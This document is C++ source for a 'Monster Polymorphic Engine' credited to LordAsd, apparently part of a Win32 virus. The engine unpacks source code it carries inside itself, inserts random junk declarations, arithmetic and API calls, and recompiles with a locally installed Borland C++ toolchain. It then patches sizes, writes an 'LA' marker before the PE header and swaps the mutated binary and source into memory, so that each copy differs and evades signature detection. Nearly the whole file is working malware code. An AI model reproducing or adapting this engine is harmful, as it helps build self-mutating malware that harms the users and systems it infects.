// Monster Polymorphic Engine [MPE] by LordAsd
// for BC++ for Win32 version 4.5 / 5.01

#include "winapp32.h"

#define PACKED_FILE_LAST 1
#define PACKED_FILE_NOT_LAST 0
#define MAX_FUNCTIONS 13
#define MAX_VARS 50

//Declaration
struct TArcFileRec
{
 UINT Last;
 UINT Size;
 char Name[15];
}/*Separator*/;


#define MAX_TRASH_INDEX 30
typedef char String[MAX_PATH];
char PM_TempDir[MAX_PATH];
char PM_Prefix[]="????";
int  GenIndex = 0;

String PM_Trash[MAX_TRASH_INDEX];

int PM_CurrIndex = -1;

//Declaration
void GetID(char* ss)
{
 GenIndex++;;
 sprintf(ss,"_%s%04X",PM_Prefix,GenIndex);;
};

//Declaration
void PM_AddToTrash(char* ss)
{
 if (PM_CurrIndex==(MAX_TRASH_INDEX-1)) { Log("ERROR"); return;;};
 PM_CurrIndex++;;
 strcpy(PM_Trash[PM_CurrIndex],ss);;
};
//Declaration
bool PM_GetFromList(int num, char* ss)
{
 if (num>PM_CurrIndex) return false;;
 strcpy(ss,PM_Trash[num]);;
 return true;;
};

//Declaration
bool PM_Init()
{
 if (SrcPtr==NULL) return false;;
 sprintf(PM_Prefix,"%04X",random(0xFFFF));;
 return GetTempDir(PM_TempDir);;
};
//Declaration
void PM_Cleanup()
{
 if (LoggingEnabled) return;;
 int x = 0;;
 String Name;;
 char   Drive[MAX_PATH];;
 char   Dir[MAX_PATH];;
 char   FName[MAX_PATH];;
 char   Ext[MAX_PATH];;

 while (PM_GetFromList(x,Name))
 {
  fnsplit(Name,Drive,Dir,FName,Ext);;
  DeleteFile(Name);;
  sprintf(Name,"%s%s%s.OBJ",Drive,Dir,FName);;
  DeleteFile(Name);;
  x++;;
 };;
};
//Declaration
bool PM_FileAvailable(char* Name, DWORD size)
{
 char ss[MAX_PATH+666];;
 strcpy(ss,BCRoot);;
 strcat(ss,Name);;
 HANDLE h1 = CreateFile(ss,GENERIC_READ,FILE_SHARE_READ,NULL,
								  OPEN_EXISTING,0,0);;
 if (h1==INVALID_HANDLE_VALUE) return false;;
 DWORD rsize = SetFilePointer(h1,0,NULL,FILE_END);;
 CloseHandle(h1);;
 if (abs(rsize-size)>50000) return false;;
 return true;;
};
//Declaration
bool PM_AllFilesAvailable()
{
 bool x1 = true;;
 bool x2 = true;;
 if (!PM_FileAvailable("\\BIN\\BCC32.EXE", 626688)) x1 = false;;
 if (!PM_FileAvailable("\\BIN\\MAKE.EXE", 90112)) x1 = false;;
 if (!PM_FileAvailable("\\BIN\\TDSTRP32.EXE", 45056)) x1 =  false;;
 if (!PM_FileAvailable("\\BIN\\COMPRESS.EXE", 15259)) x1 =  false;;

 if (!PM_FileAvailable("\\BIN\\BCC32.EXE", 675840)) x2 = false;;
 if (!PM_FileAvailable("\\BIN\\BRC32.EXE", 47684))  x2 = false;;
 if (!PM_FileAvailable("\\BIN\\TLINK32.EXE", 180224)) x2 =  false;;
 if (!PM_FileAvailable("\\BIN\\COMPRESS.EXE", 15259)) x2 =  false;;

 return (x1 || x2);;
};
//Declaration
bool PM_Unpack()
{
 char src_name[MAX_PATH];;
 strcpy(src_name,PM_TempDir);;
 strcat(src_name,"\\WINAPP32.LZZ");;
 PM_AddToTrash(src_name);;
 HANDLE h1 = CreateFile(src_name,GENERIC_WRITE,0,NULL,CREATE_NEW,0,0);;
 if (h1==INVALID_HANDLE_VALUE) return false;;
 DWORD written;;
 WriteFile(h1,SrcPtr,SSize,&written,NULL);;
 CloseHandle(h1);;
 if (written!=SSize) return false;;
 OFSTRUCT lz_fdata;;
 OFSTRUCT lz_fdata2;;
 char dest_name[MAX_PATH];;
 strcpy(dest_name,PM_TempDir);;
 strcat(dest_name,"\\WINAPP32.LZX");;
 PM_AddToTrash(dest_name);;
 INT lz_src = LZOpenFile(src_name,&lz_fdata,OF_READ);;
 if (lz_src<0) return false;;
 INT lz_dest = LZOpenFile(dest_name,&lz_fdata2,OF_CREATE);;
 LONG check = LZCopy(lz_src,lz_dest);;
 LZClose(lz_src);;
 LZClose(lz_dest);;
 if (check<0) return false;;
 DeleteFile(src_name);;
 h1 = CreateFile(dest_name,GENERIC_READ,0,NULL,OPEN_EXISTING,0,0);;
 if (h1==INVALID_HANDLE_VALUE) return false;;
 TArcFileRec FInfo;;
 FInfo.Last = PACKED_FILE_NOT_LAST;;
 while (FInfo.Last==PACKED_FILE_NOT_LAST)
 {
  DWORD readed;;
  ReadFile(h1,&FInfo,sizeof(FInfo),&readed,NULL);;
  if (readed!=sizeof(FInfo)) {CloseHandle(h1);; return false;;};;
  char Name[MAX_PATH];;
  sprintf(Name,"%s\\%s",PM_TempDir,FInfo.Name);;
  PM_AddToTrash(Name);;
  HANDLE h2 = CreateFile(Name,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,0);;
  if (h2==INVALID_HANDLE_VALUE) {CloseHandle(h1);; return false;;};;
  void* shit = malloc(FInfo.Size);;
  ReadFile(h1,shit,FInfo.Size,&readed,NULL);;
  DWORD written;;
  WriteFile(h2,shit,FInfo.Size,&written,NULL);;
  CloseHandle(h2);;
  if ((readed!=FInfo.Size)||(written!=FInfo.Size))
	{CloseHandle(h1);; return false;;};;
  free(shit);;
 };; // While not last file
 CloseHandle(h1);;
 return true;;
};

//Declaration
void CreatePragma(char* s)
{
 strcpy(s,"");;
#pragma message "Function not implemented"
};

struct TFuncRec
{
 char  ID[10];
 char  RetType[MAX_TYPE_ID_LENGTH];
 bool  VoidRet;
};
int FuncIndex = -1;
TFuncRec FuncData[MAX_FUNCTIONS];

struct TVarRec
{
 char  ID[10];
 char  Type[MAX_TYPE_ID_LENGTH];
};
int VarIndex = -1;
TVarRec VarData[MAX_VARS];

//Declaration  // this one returns VarIndex for new variable, or -1 if fault
int DeclareVar(HANDLE h,char* type)
{
 if (VarIndex==(MAX_VARS-1))
  {Log("ERROR"); return -1;;};;
 VarIndex++;;
 char s[MAX_LINE];;
 GetID(VarData[VarIndex].ID);;
 strcpy(VarData[VarIndex].Type,type);;
 sprintf(s,"%s %s;",type,VarData[VarIndex].ID);;
 Writeln(h,s);;
 return 0;;
};

//Declaration
void GenAriAssign(HANDLE h)
{
 char t[3];;
 char ss[MAX_LINE];;
 int  x = random(N_TYPES);;
 strcpy(t,Types[x].sh);;
 if (Types[x].ari!=1) // Invalid type for ari operations
 {
  if (stricmp(t,"ch")==0) return;;
  sprintf(ss,"XX%s%u = XX%s%u; %s",t,random(3),t,random(3),MUT);;
  Writeln(h,ss);;
  return;;
 };;
 char	aa[100];;
 sprintf(ss,"%s XX%s%u = 1 ",MUT,t,random(4));;
 for (int i=0; i<random(4)+1; i++)
 {
  strcat(ss,ari_op[random(N_ARI_OP)]);;
  switch (random(3))
  {
	case 0 :
	 sprintf(aa,"%u",random(100));;
	 break;
	default :
	 sprintf(aa,"XX%s%u",t,random(4));;
  };; //switch
  strcat(ss,aa);;
 };;//for
 strcat(ss,";");;
 Writeln(h,ss);;
};
//Declaration
void GenApiCall(HANDLE h)
{
 TApiCallRec This = ApiCallData[random(N_API_CALLS)];;
 char s[MAX_LINE],ss[MAX_LINE];;
 strcpy(s,"");;
 if (!This.RetVoid) sprintf(s,"XX%s%u = ",This.ret_type,random(4));;
 sprintf(ss,"%s(",This.name);;
 strcat(s,ss);;
 for (int i=0; i<This.num_params; i++)
 {
  sprintf(ss,"XX%s%u",This.params[i],random(4));;
  strcat(s,ss);;
  if (i!=(This.num_params-1)) strcat(s,",");;
 };;//For
 strcat(s,");");;
 strcat(s,MUT);;
 Writeln(h,s);;
};


//Declaration
void GenAnyCode(HANDLE h)
{
 char foo[5]="{;";;
 strcat(foo,";");;
 Writeln(h,foo);;
 for (int i=0; i<random(5); i++)
 {
  switch (random(10))
  {
	case 0 :
	case 1 :
	case 2 :
	  DeclareVar(h,Types[random(N_TYPES)].lo);; break;
	case 3 :
	case 4 :
	case 5 :
	  GenAriAssign(h);; break;
	case 6 :
	case 7 :
	case 8 :
	  GenApiCall(h);; break;
  };; //switch
 };;
 foo[0] = '}';
 Writeln(h,foo);;
};;
//Declaration

void DeclareFunction(HANDLE h)
{
 char ss[100];;
 if (FuncIndex==(MAX_FUNCTIONS-1)) return;;
 FuncIndex++;;
 FuncData[FuncIndex].VoidRet = true;;
 GetID(FuncData[FuncIndex].ID);;
 strcpy(FuncData[FuncIndex].RetType,"void");;
 Writeln(h,PM_Declare);;
 sprintf(ss,"inline %s",MUT);;
 if (random(13)==0) Writeln(h,ss);;
 sprintf(ss,"%s %s()",FuncData[FuncIndex].RetType,FuncData[FuncIndex].ID);;
 Writeln(h,ss);;
 GenAnyCode(h);;
};
//Declaration
void ProcessTextFile(char* Name1, char* Name2)
{
 FuncIndex = -1;;
 VarIndex = -1;;
 char ss[MAX_LINE];;
 HANDLE h1 = CreateFile(Name1,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,0);;
 if (h1==INVALID_HANDLE_VALUE) return;;
 HANDLE h2 = CreateFile(Name2,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,0);;
 if (h2==INVALID_HANDLE_VALUE) {CloseHandle(h1);; return;;};;
 char s[MAX_LINE];;
 while (Readln(h1,s))
 {
  // Mutation
  if (random(100)==0) { CreatePragma(ss);; Writeln(h2,ss);;};;
  if ((strstr(s,PM_Declare)!=NULL)&&(random(13)==0)) DeclareFunction(h2);;
  if ((strstr(s,PM_EndLine)!=NULL)&&(random(100)==0)&&(strlen(s)<200))
  {
	strcpy(ss,strstr(s,PM_EndLine));;
	*(strstr(s,PM_EndLine)+2)='\0';;
	Writeln(h2,s);;
	GenAnyCode(h2);;
	strcpy(s,ss);;
  };;
  // Original line
  Writeln(h2,s);;
 };;
 Writeln(h2,s);;
 CloseHandle(h1);;
 CloseHandle(h2);;
 return;;
};
//Declaration
void PM_AddSource(char* AddName,char* TargetName,int status)
{
 HANDLE h1 = CreateFile(AddName,GENERIC_WRITE,0,NULL,OPEN_ALWAYS,0,0);;
 HANDLE h2 = CreateFile(TargetName,GENERIC_READ,0,NULL,OPEN_EXISTING,0,0);;
 if ((h1==INVALID_HANDLE_VALUE)||(h2==INVALID_HANDLE_VALUE)) return;;
 TArcFileRec FInfo;;
 SetFilePointer(h1,0,NULL,FILE_END);;
 FInfo.Size = SetFilePointer(h2,0,NULL,FILE_END);;
 SetFilePointer(h2,0,NULL,FILE_BEGIN);;
 FInfo.Last = status;;
 char   Drive[MAX_PATH];;
 char   Dir[MAX_PATH];;
 char   Name[MAX_PATH];;
 char   Ext[MAX_PATH];;
 fnsplit(TargetName,Drive,Dir,Name,Ext);;
 strcpy(FInfo.Name,Name);;
 strcat(FInfo.Name,Ext);;
 void* buf = malloc(FInfo.Size);;
 DWORD readed = 0;;
 WriteFile(h1,&FInfo,sizeof(FInfo),&readed,NULL);;
 ReadFile(h2,buf,FInfo.Size,&readed,NULL);;
 WriteFile(h1,buf,FInfo.Size,&readed,NULL);;
 CloseHandle(h1);;
 CloseHandle(h2);;
 free(buf);;
 return;;
};

//Declaration
void PermutationEngine()
{
// Check if all OK
 if (BadImage)   return;;
 if (Permutated) return;;
 Permutated = true;; // Only one (no more than one) attempt during session
 if (!PM_Init()) return;;
 if (!PM_AllFilesAvailable()) return;;

// Unpack sources
 if (!PM_Unpack()) {PM_Cleanup();;return;;};;
// CPP files mutation
 int x = 0;;
 String Name;;
 char CurrName[MAX_PATH];;
 strcpy(CurrName,PM_TempDir);;
 strcat(CurrName,"\\CURRENT.MUT");;
 PM_AddToTrash(CurrName);;
 while (PM_GetFromList(x,Name))
 {
  if (stricmp(Ext(Name),".CPP")==0)
  {
	MoveFile(Name,CurrName);;
	ProcessTextFile(CurrName,Name);;
	DeleteFile(CurrName);;
  }; // .CPP extension
  x++;;
 };
 sprintf(Name,"%s\\BCCW32.CFG",PM_TempDir);;
 PM_AddToTrash(Name);;
 sprintf(Name,"%s\\WINAPP32.RES",PM_TempDir);;
 PM_AddToTrash(Name);;

// Makefile processing
 sprintf(Name,"%s\\WINAPP32.MAK",PM_TempDir);;
 HANDLE h1 = CreateFile(Name,GENERIC_READ,0,NULL,OPEN_ALWAYS,0,0);;
 sprintf(Name,"%s\\THIS_ONE.MAK",PM_TempDir);;
 PM_AddToTrash(Name);;
 HANDLE h2 = CreateFile(Name,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,0);;
 if ((h1==INVALID_HANDLE_VALUE)||(h2==INVALID_HANDLE_VALUE))
  { PM_Cleanup();; return;; };;
 DWORD size = SetFilePointer(h1,0,NULL,FILE_END);;
 char* foo = (char* )malloc(size);;
 char* zu = foo;;
 SetFilePointer(h1,0,NULL,FILE_BEGIN);;
 DWORD bar;;
 ReadFile(h1,foo,size,&bar,NULL);;
 for (int i=0; i<size; i++)
 {
  if ((*foo)=='^')
	 WriteFile(h2,&BCRoot,strlen(BCRoot),&bar,NULL);
	else
	 WriteFile(h2,foo,1,&bar,NULL);;
  foo++;;
 };
 CloseHandle(h1);;
 CloseHandle(h2);;
 free(zu);;
// 1st compilation

 char ex[MAX_PATH];;
 char Strip[MAX_PATH];;
 char Target[MAX_PATH];;

 sprintf(Target,"%s\\WINAPP32.EXE",PM_TempDir);;
 sprintf(ex,"%s\\BIN\\MAKE.EXE -f  %s\\THIS_ONE.MAK ",BCRoot,PM_TempDir);;
 sprintf(Strip,"%s\\BIN\\TDSTRP32.EXE %s",BCRoot,Target);;
 PM_AddToTrash(Target);;

 if (!Exec(ex,PM_TempDir)) { PM_Cleanup();; return;; };;
 if (!Exec(Strip,PM_TempDir)) {PM_Cleanup();; return;; };;

// 1st compile result check

 h1 = CreateFile(Target,GENERIC_READ,0,NULL,OPEN_EXISTING,0,0);;
 if (h1==INVALID_HANDLE_VALUE) { PM_Cleanup();; return;; };;
 DWORD TargetSize = SetFilePointer(h1,0,NULL,FILE_END);;
 CloseHandle(h1);;

// Process sources, build archive and compress it

 x=0;;
 char Solid[MAX_PATH];;
 sprintf(Solid,"%s\\WINAPP32.SRX",PM_TempDir);;
 PM_AddToTrash(Solid);;
 while (PM_GetFromList(x,Name))
 {
  if (stricmp(Ext(Name),".CPP")==0) PM_AddSource(Solid,Name,PACKED_FILE_NOT_LAST);;
  x++;;
 };;
 sprintf(Name,"%s\\WINAPP32.MAK",PM_TempDir);;
 PM_AddSource(Solid,Name,PACKED_FILE_NOT_LAST);;
 sprintf(Name,"%s\\WINAPP32.DEF",PM_TempDir);;
 PM_AddSource(Solid,Name,PACKED_FILE_NOT_LAST);;
 sprintf(Name,"%s\\WINAPP32.RC",PM_TempDir);;
 PM_AddSource(Solid,Name,PACKED_FILE_NOT_LAST);;
 sprintf(Name,"%s\\WINAPP32.H",PM_TempDir);;
 PM_AddSource(Solid,Name,PACKED_FILE_LAST);;

 char Compressed[MAX_PATH];;
 sprintf(Compressed,"%s\\WINAPP32.SRN",PM_TempDir);;
 PM_AddToTrash(Compressed);;
 char ss[MAX_PATH+666];;
 sprintf(ss,"%s\\BIN\\COMPRESS.EXE %s %s",BCRoot,Solid,Compressed);;
 if (!Exec(ss,PM_TempDir)) {PM_Cleanup();; return;; };;
 h1 = CreateFile(Compressed,GENERIC_READ,0,NULL,OPEN_EXISTING,0,0);;
 if (h1==INVALID_HANDLE_VALUE) {PM_Cleanup();;  return;; };;
 DWORD SrcSize = SetFilePointer(h1,0,NULL,FILE_END);;
 CloseHandle(h1);;
// Update WINAPP32.H to new sizes
 char WinApp32h[MAX_PATH];;
 char NewWinApp32h[MAX_PATH];;
 sprintf(WinApp32h,"%s\\WINAPP32.H",PM_TempDir);;
 sprintf(NewWinApp32h,"%s\\HEADER.NEW",PM_TempDir);;
 h1 = CreateFile(WinApp32h,GENERIC_READ,0,NULL,OPEN_EXISTING,0,0);;
 if (h1==INVALID_HANDLE_VALUE) { PM_Cleanup();;  return;; };;
 h2 = CreateFile(NewWinApp32h,GENERIC_WRITE,0,NULL,CREATE_NEW,0,0);;
 if (h1==INVALID_HANDLE_VALUE) { PM_Cleanup();;  return;; };;
 char s[MAX_LINE];;
 while (Readln(h1,s))
 {
  if (strstr(s,vs_const)!=NULL)
	sprintf(s,"DWORD VSize = %u; const char vs_const[]=\"%s\";",TargetSize,vs_const);;
  if (strstr(s,ss_const)!=NULL)
	sprintf(s,"DWORD SSize = %u; const char ss_const[]=\"%s\";",SrcSize,ss_const);;
  Writeln(h2,s);;
 };;
 Writeln(h2,s);;
 CloseHandle(h1);;
 CloseHandle(h2);;
 DeleteFile(WinApp32h);;
 MoveFile(NewWinApp32h,WinApp32h);;

// 2nd compile

 DeleteFile(Target);;
 while (PM_GetFromList(x,Name))
 {
  if (stricmp(Ext(Name),".OBJ")==0) DeleteFile(Name);;
  x++;;
 };;

 if (!Exec(ex,PM_TempDir)) { PM_Cleanup();; return;; };;
 if (!Exec(Strip,PM_TempDir))	{ PM_Cleanup();; return;; };;

// 2nd compile result check

 h1 = CreateFile(Target,GENERIC_READ | GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,0);;
 if (h1==INVALID_HANDLE_VALUE) { PM_Cleanup();; return;; };;
 DWORD CheckSize = SetFilePointer(h1,0,NULL,FILE_END);;
 if (CheckSize!=TargetSize) {CloseHandle(h1); PM_Cleanup();; return;; };;
 BadImage = true;;
 SetFilePointer(h1,0,NULL,FILE_BEGIN);;
 free(VPtr);;
 VSize = TargetSize;;
 VPtr = malloc(VSize);;
 DWORD readed  = 0;;
 DWORD written;;
 ReadFile(h1,VPtr,VSize,&readed,NULL);;
 char* hru = (char*)VPtr;;
 DWORD ii = (*(hru+0x3C)) + (*(hru+0x3D))*0x100;;
 if ( ((*(hru+ii))!='P')&&((*(hru+ii+1))!='E'))
  { CloseHandle(h1);; PM_Cleanup();; return;; };;
 *(hru+ii-2) = 'L';;
 *(hru+ii-1) = 'A';;

// Link, replacing new source

 h2 = CreateFile(Compressed,GENERIC_READ,0,NULL,OPEN_EXISTING,0,0);;
 free(SrcPtr);;
 SrcPtr = malloc(SrcSize);;
 SSize = SrcSize;;
 ReadFile(h2,SrcPtr,SrcSize,&readed,NULL);;
 CloseHandle(h1);;
 CloseHandle(h2);;
 if (readed!=SrcSize) { PM_Cleanup();; return;; };;
 BadImage = false;;
 DeleteFile(Target);;
 PM_Cleanup();;
};

//Declaration


